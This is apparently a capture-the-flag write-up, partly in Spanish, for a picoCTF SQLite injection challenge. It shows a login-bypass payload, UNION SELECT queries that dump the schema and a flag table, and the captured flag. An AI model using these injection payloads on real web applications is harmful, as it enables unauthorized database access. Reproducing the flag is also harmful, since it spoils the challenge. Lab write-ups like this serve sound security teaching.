## Descripción 
Can you find the flag on this website.

Additional details will be available after launching your challenge instance.

Hint:
1. SQLiLite
## Solución 1

Primero nos logeamos con admin, admin y luego nos dice que vamos a necesitar una inyección sql así que usamos  ' or 1 == 1;' después nos metemos a la página de las referencias para ver algunas SQLite Injection y buscamos las que necesitemos

```
 Algiers' union SELECT sql,2,3 from sqlite_master;
 
 'union select id,flag,3 from more_table;
 
|City|Address|Phone|
|---|---|---|
|1|picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8ee9477}|3|
|2|If you are here, you must have seen it|

flag: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8ee9477}
```

## Referencias 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md